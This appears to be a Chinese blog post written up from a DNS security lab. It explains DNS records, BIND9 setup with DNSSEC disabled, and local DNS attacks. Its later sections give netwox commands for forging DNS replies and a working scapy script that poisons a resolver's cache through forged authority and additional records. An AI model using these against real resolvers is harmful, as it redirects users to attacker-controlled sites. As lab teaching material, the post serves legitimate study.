@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Snake_32px.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Snake_16px.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Snake.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一、Local DNS Attack0. DNS概述0.1 DNS服务DNS是一个在因特网上实现分布式数据库的精彩范例。 1234主机名与ip的转换。主机别名（host aliasing). 复杂主机名有一或多个别名。eg: a.b.helloworld.com（规范主机名）的主机，可能还有hello-world和www.helloworld.com的别名。可用DNS获得主机别名对应的规范主机名和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS Attack">
+<meta property="og:url" content="http://yoursite.com/2019/Web/DNS Attack/index.html">
+<meta property="og:site_name" content="SsatanS">
+<meta property="og:description" content="一、Local DNS Attack0. DNS概述0.1 DNS服务DNS是一个在因特网上实现分布式数据库的精彩范例。 1234主机名与ip的转换。主机别名（host aliasing). 复杂主机名有一或多个别名。eg: a.b.helloworld.com（规范主机名）的主机，可能还有hello-world和www.helloworld.com的别名。可用DNS获得主机别名对应的规范主机名和">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-03-28T09:49:58.263Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DNS Attack">
+<meta name="twitter:description" content="一、Local DNS Attack0. DNS概述0.1 DNS服务DNS是一个在因特网上实现分布式数据库的精彩范例。 1234主机名与ip的转换。主机别名（host aliasing). 复杂主机名有一或多个别名。eg: a.b.helloworld.com（规范主机名）的主机，可能还有hello-world和www.helloworld.com的别名。可用DNS获得主机别名对应的规范主机名和">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/Web/DNS Attack/">
+
+
+
+
+
+  <title>DNS Attack | SsatanS</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SsatanS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Stay Hungry</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/categories/ctf/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag-checkered"></i> <br>
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/Pwn/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-product-hunt"></i> <br>
+            
+            Pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br>
+            
+            Web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wifi">
+          <a href="/categories/wifi" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wifi"></i> <br>
+            
+            Wifi
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-others">
+          <a href="/categories/others/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-list"></i> <br>
+            
+            Others
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/Web/DNS Attack/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="失神我醉了">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/iam.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SsatanS">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DNS Attack</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-20T17:05:13+08:00">
+                2019-08-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、Local-DNS-Attack"><a href="#一、Local-DNS-Attack" class="headerlink" title="一、Local DNS Attack"></a>一、Local DNS Attack</h2><h3 id="0-DNS概述"><a href="#0-DNS概述" class="headerlink" title="0. DNS概述"></a>0. DNS概述</h3><h4 id="0-1-DNS服务"><a href="#0-1-DNS服务" class="headerlink" title="0.1 DNS服务"></a>0.1 DNS服务</h4><p>DNS是一个在因特网上实现分布式数据库的精彩范例。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主机名与ip的转换。</span><br><span class="line">主机别名（host aliasing). 复杂主机名有一或多个别名。eg: a.b.helloworld.com（规范主机名）的主机，可能还有hello-world和www.helloworld.com的别名。可用DNS获得主机别名对应的规范主机名和ip地址。	</span><br><span class="line">邮件服务器别名（mail server aliasing)  MX记录允许公司的邮件服务器和Web服务器使用相同（别名化的）主机名。</span><br><span class="line">负载分配（load distribution）。eg：多台冗余Web服务器，ip地址集合与同一个规范主机名联系，则DNS可轮流用ip地址集合的ip进行http响应。</span><br></pre></td></tr></table></figure>
+<h4 id="0-2-DNS工作原理"><a href="#0-2-DNS工作原理" class="headerlink" title="0.2 DNS工作原理"></a>0.2 DNS工作原理</h4><p>​    根服务器，顶级域（TLD）DNS服务器，权威DNS服务器。</p>
+<p>递归查询：客户与本地dns服务器，迭代查询：本地与根，TLD，权威服务器通讯</p>
+<h4 id="0-3-DNS-记录和报文"><a href="#0-3-DNS-记录和报文" class="headerlink" title="0.3 DNS 记录和报文"></a>0.3 DNS 记录和报文</h4><p>​    DNS服务器存储资源记录，包含下列四元组</p>
+<p>​    （Name, Value, Type, TTL）    TTL觉得缓存删除的时间。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Type=A , Name=主机名   Value=主机名对应IP地址</span><br><span class="line">Type=NS  Name是个域	Value是知道如何获得该域主机ip地址的权威DNS服务器的主机名 eg:(a.com, dns.a.com, NS)</span><br><span class="line">Type=CNAME,	Name=主机别名， Value= 别名为Name的主机对应规范主机名  eg:(a.com, cc.gg.a.com,CNAME)</span><br><span class="line">Type=MX	Name=主机别名	Value=规范主机名	eg:(a.com, mail.gg.a.com, MX)</span><br><span class="line"></span><br><span class="line">eg： 一台edu TLD服务器不是主机a.b.c.edu权威服务器，则该服务器将包含b.c.edu的域记录（c.edu,dns.c.edu, NS) , 还将包含A记录（dns.c.edu, 1.1.1.1, A)</span><br></pre></td></tr></table></figure>
+<h4 id="0-4-DNS协议头部"><a href="#0-4-DNS协议头部" class="headerlink" title="0.4 DNS协议头部"></a>0.4 DNS协议头部</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id(2字节)		  DNS报文的ID标识，对于请求报文和其对应的应答报文，这个字段是相同</span><br><span class="line">QR（1bit）	查询/响应标志，0为查询，1为响应</span><br><span class="line">opcode（4bit）	0表示标准查询，1表示反向查询，2表示服务器状态查询</span><br><span class="line">AA（1bit）	表示授权回答 应答才有意义</span><br><span class="line">TC（1bit）	表示可截断的</span><br><span class="line">RD（1bit）	表示期望递归	请求设置</span><br><span class="line">RA（1bit）	表示可用递归	应答设置</span><br><span class="line">z(3bit)		  保留值</span><br><span class="line">rcode（4bit）	表示应答码，0表示没有差错，3表示名字差错，2表示服务器错误（Server Failure）</span><br><span class="line">数量字段（8字节）  Questions、Answer RRs、Authority RRs、Additional RRs</span><br></pre></td></tr></table></figure>
+<h3 id="1-Setting-Up-Lab-environment"><a href="#1-Setting-Up-Lab-environment" class="headerlink" title="1. Setting Up Lab environment"></a>1. Setting Up Lab environment</h3><h4 id="1-1-Configure-the-User-Machine"><a href="#1-1-Configure-the-User-Machine" class="headerlink" title="1.1 Configure the User Machine"></a>1.1 Configure the User Machine</h4><p>​    user machine:   change <code>/etc/resolvconf/resolv.conf.d/head</code> file.</p>
+<p>The content of the head file will be prepended to the dynamically generated resolver configuration file</p>
+<p>计算机将从此文件下的域名服务器解析域名。</p>
+<p>添加域名服务器到/etc/resolvconf/resolv.conf.d/head   ，而不选择/etc/resolv.conf, 是因为DHCP会覆盖/etc/resolv.conf。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Add the following entry to /etc/resolvconf/resolv.conf.d/head</span><br><span class="line">	nameserver 10.0.2.16</span><br><span class="line">Run the following command for the change to take effect</span><br><span class="line">$ sudo resolvconf -u</span><br></pre></td></tr></table></figure>
+<h4 id="1-2-Configure-the-DNS-Server"><a href="#1-2-Configure-the-DNS-Server" class="headerlink" title="1.2 Configure the DNS Server"></a>1.2 Configure the DNS Server</h4><p>​    安装DNS server software   BIND9</p>
+<h5 id="1-2-1-Configure-BIND9-Server"><a href="#1-2-1-Configure-BIND9-Server" class="headerlink" title="1.2.1 Configure BIND9 Server"></a>1.2.1 Configure BIND9 Server</h5><p>​    设置BIND9 DNS缓存文件   修改<code>/etc/bind/named.conf.options</code>file.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">options &#123;</span><br><span class="line">	dump-file &quot;/var/cache/bind/dump.db&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>​    应用设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rndc dumpdb -cache // Dump the cache to the sepcified file</span><br><span class="line">$ sudo rndc flush // Flush the DNS cache</span><br></pre></td></tr></table></figure>
+<p>​    turn off  DNSSEC。DNSSEC is introduced to protect against spoofing attacks on DNS servers。</p>
+<p>modifying the named.conf.options file.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">options &#123;</span><br><span class="line">	# dnssec-validation auto;</span><br><span class="line">	dnssec-enable no;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>​    开启dns服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service bind9 restart</span><br></pre></td></tr></table></figure>
+<h5 id="1-2-2-Host-a-Zone-in-the-Local-DNS-Server"><a href="#1-2-2-Host-a-Zone-in-the-Local-DNS-Server" class="headerlink" title="1.2.2 Host a Zone in the Local DNS Server"></a>1.2.2 Host a Zone in the Local DNS Server</h5><p>​    我们使用local DNS server 作为example.com域的权威名称服务器。</p>
+<p>创建2个区域条目，正向解析(from hostname to IP)，反向解析(from IP to hostname) ，添加下面内容于<code>/etc/bind/named.conf</code> 文件下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zone &quot;example.com&quot; &#123;</span><br><span class="line">		type master;</span><br><span class="line">		file &quot;/etc/bind/example.com.db&quot;;</span><br><span class="line">	&#125;;</span><br><span class="line">zone &quot;0.168.192.in-addr.arpa&quot; &#123;</span><br><span class="line">		type master;</span><br><span class="line">		file &quot;/etc/bind/192.168.0.db&quot;;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
+<p>​    Create and Setup up the forward lookup zone file。<code>/etc/bind/example.com.db</code> 文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$TTL 3D ; default expiration time of all resource records without</span><br><span class="line">		; their own TTL</span><br><span class="line">@ 		IN		 SOA 	ns.example.com. admin.example.com. (</span><br><span class="line">		1 				; Serial</span><br><span class="line">		8H 				; Refresh</span><br><span class="line">		2H 				; Retry</span><br><span class="line">		4W 				; Expire</span><br><span class="line">		1D ) 			; Minimum</span><br><span class="line">@ 		IN 		NS 				ns.example.com. 		;Address of nameserver</span><br><span class="line">@ 		IN 		MX 				10 mail.example.com. 	;Primary Mail Exchanger</span><br><span class="line">www 	IN 		A 				192.168.0.101 			;Address of www.example.com</span><br><span class="line">mail 	IN		A 				192.168.0.102 			;Address of mail.example.com</span><br><span class="line">ns 		IN 		A 				192.168.0.10 			;Address of ns.example.com</span><br><span class="line">*.example.com. IN A 			192.168.0.100 			;Address for other URL in</span><br><span class="line">														; the example.com domain</span><br></pre></td></tr></table></figure>
+<p>“@”特殊符号，代表example.com。该区域文件包含7个resource records (RRs)，包括 a SOA (Start Of Authority) RR, a NS (Name Server) RR, a MX (Mail eXchanger) RR, and 4 A (host Address) RRs。‘@’ here stands for example.com.</p>
+<p>​    Create and Setup up the reverse lookup zone file。<code>/etc/bind/192.168.0.db</code>文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$TTL 3D</span><br><span class="line">@ 		IN 		SOA 		ns.example.com. admin.example.com. (</span><br><span class="line">				1</span><br><span class="line">				8H</span><br><span class="line">				2H</span><br><span class="line">				4W</span><br><span class="line">				1D)</span><br><span class="line">@ 		IN 		NS 			ns.example.com.</span><br><span class="line">101 	IN 		PTR 		www.example.com.</span><br><span class="line">102 	IN 		PTR 		mail.example.com.</span><br><span class="line">10 		IN 		PTR			ns.example.com.</span><br></pre></td></tr></table></figure>
+<p>最后Restart the BIND server， 用 命令<code>dig   www.example.com</code>   测试。</p>
+<h3 id="2-Attacks-on-DNS"><a href="#2-Attacks-on-DNS" class="headerlink" title="2. Attacks  on  DNS"></a>2. Attacks  on  DNS</h3><h4 id="2-1-Modifying-the-Host-File"><a href="#2-1-Modifying-the-Host-File" class="headerlink" title="2.1 Modifying the Host File"></a>2.1 Modifying the Host File</h4><p>​    <code>/etc/hosts</code> 文件用于本地域名查询，优先于远程dns查询。if  you controll users computer , you can change hosts that user will go the site which you fake.</p>
+<p>​    dig 命名会忽视hosts文件，而ping 和web游览器不会。</p>
+<h4 id="2-2-Directly-Spoofing-Response-to-User"><a href="#2-2-Directly-Spoofing-Response-to-User" class="headerlink" title="2.2 Directly Spoofing Response to User"></a>2.2 Directly Spoofing Response to User</h4><p>​    伪造DNS响应需要满足以下几个条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. src ip 为DNS服务器IP</span><br><span class="line">2. dst ip 为 受害者ip</span><br><span class="line">3. src port 53</span><br><span class="line">4. dst port 为 DNS 请求的src port</span><br><span class="line">5. UDP 校验码 计算准确</span><br><span class="line">6. transaction ID 必须与DNS请求一致</span><br><span class="line">7. DNS响应的 question section 域名必须与DNS请求question section 域名一致</span><br><span class="line">8. DNS响应的  answer section域名必须与DNS请求question section 域名一致</span><br><span class="line">9. 受害者接受 攻击者的DNS 响应 须在正规DNS 响应之前。</span><br></pre></td></tr></table></figure>
+<p>​    可以通过sniff（嗅探）获取1-8的信息。下面使用工具伪造DNS reply</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo netwox 105 -h &quot;www.example.com&quot; -H &quot;6.6.6.6&quot; -a &quot;ns.example.com&quot; -A &quot;6.6.6.9&quot; -f &quot;src host 192.168.10.134&quot;</span><br><span class="line"></span><br><span class="line">Parameters:</span><br><span class="line">-h|--hostname data hostname</span><br><span class="line">-H|--hostnameip ip IP address</span><br><span class="line">-a|--authns data authoritative nameserver</span><br><span class="line">-A|--authnsip ip authns IP</span><br><span class="line">-d|--device device device name</span><br><span class="line">-T|--ttl uint32 ttl in seconds</span><br><span class="line">-f|--filter filter pcap filter</span><br><span class="line">-s|--spoofip spoofip IP spoof initialization type</span><br><span class="line">注意： -h 字段不影响受害者想要请求的域名，该工具会自动通过嗅探修改响应域名为用户的。-h字段必须有。</span><br><span class="line">实际使用，提前信息收集受害者的域名和权威名称域名服务器，话说要伪造网站，的确需提前收集。</span><br></pre></td></tr></table></figure>
+<h4 id="2-3-DNS-Cache-Poisoning-Attack"><a href="#2-3-DNS-Cache-Poisoning-Attack" class="headerlink" title="2.3 DNS Cache Poisoning Attack"></a>2.3 DNS Cache Poisoning Attack</h4><p>​    当本地DNS服务器没有请求域名的ip信息时，会向外界DNS服务器进行查询，此次攻击通过欺骗本地DNS服务器，伪造外界DNS服务器响应，使本地DNS服务器的缓存长时间保持伪造的响应。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netwox 105 -h &quot;www.example.cn&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.example.cn&quot; -A &quot;1.2.3.5&quot; -f &quot;src host 10.10.10.137&quot; --spoofip &quot;raw&quot;</span><br><span class="line"></span><br><span class="line">$ sudo rndc flush</span><br><span class="line">$ sudo rndc dumpdb -cache		#保存缓存并查看是否被spoof</span><br><span class="line">$ sudo cat /var/cache/bind/dump.db</span><br></pre></td></tr></table></figure>
+<h4 id="2-4-DNS-Cache-Poisoning-Targeting-the-Authority-Section；another-Domain-Additional-Section。"><a href="#2-4-DNS-Cache-Poisoning-Targeting-the-Authority-Section；another-Domain-Additional-Section。" class="headerlink" title="2.4 DNS Cache Poisoning: Targeting the Authority Section；another Domain; Additional Section。"></a>2.4 DNS Cache Poisoning: Targeting the Authority Section；another Domain; Additional Section。</h4><p>​    伪造Authority Section的地址，使之可以伪造整个example.net 域。若attacker32.com为我们的，则整个example.net 域都将被控制。</p>
+<p>Authority Section和Additional Section的信息得与查询域名相关，否则不将被缓存。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">example.net. 259200 IN NS attacker32.com.</span><br><span class="line">google.com. 259200 IN NS attacker32.com.</span><br><span class="line">----------------------------------------------------</span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">example.net. 259200 IN NS attacker32.com.</span><br><span class="line">example.net. 259200 IN NS ns.example.net.</span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">attacker32.com. 259200 IN A 1.2.3.4 ➀</span><br><span class="line">ns.example.net. 259200 IN A 5.6.7.8 ➁</span><br><span class="line">www.facebook.com. 259200 IN A 3.4.5.6 ➂</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python </span><br><span class="line">#spoof DNS cache</span><br><span class="line">#验证本地DNS服务器缓存条目</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">def spoof_dns(pkt):</span><br><span class="line">    if(DNS in pkt and &apos;www.example.net&apos; in pkt[DNS].qd.qname):</span><br><span class="line">        #swap the source and dst ip address</span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line"></span><br><span class="line">        #swap src and dst port</span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)</span><br><span class="line"></span><br><span class="line">        #The answer section</span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type=&apos;A&apos;, ttl=259200, rdata=&apos;10.0.2.5&apos;)</span><br><span class="line"></span><br><span class="line">        #The authority section</span><br><span class="line">        #NSsec1 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;ns1.example.net&apos;)	#缓存</span><br><span class="line">        NSsec1 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;attacker.com&apos;)		#缓存</span><br><span class="line">        NSsec2 = DNSRR(rrname=&apos;google.com&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;attacker.com&apos;)			#不缓存</span><br><span class="line">        #NSsec2 = DNSRR(rrname=&apos;example.net&apos;, type=&apos;NS&apos;, ttl=259200,rdata=&apos;ns2.example.net&apos;)		#缓存</span><br><span class="line"></span><br><span class="line">        #The additional section</span><br><span class="line">        #Addsec1 = DNSRR(rrname=&apos;ns1.example.net&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;1.2.3.4&apos;)				</span><br><span class="line">        Addsec1 = DNSRR(rrname=&apos;attacker.com&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;1.2.3.4&apos;)</span><br><span class="line">        Addsec2 = DNSRR(rrname=&apos;ns2.example.net&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;5.6.7.8&apos;)				#缓存</span><br><span class="line">        Addsec3 = DNSRR(rrname=&apos;www.facebook.com&apos;,type=&apos;A&apos;, ttl=259200,rdata=&apos;3.4.5.6&apos;)				#不缓存</span><br><span class="line"></span><br><span class="line">        #Construct the DNS packet</span><br><span class="line">        DNSpkt = DNS(id = pkt[DNS].id, qd=pkt[DNS].qd,aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=2,arcount=2,an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)</span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"></span><br><span class="line">#Sniff UDP query packets and invoke spoof_dns().</span><br><span class="line">pkt = sniff(filter=&apos;src host 10.10.10.137 and dst port 53&apos;, prn=spoof_dns)</span><br></pre></td></tr></table></figure>
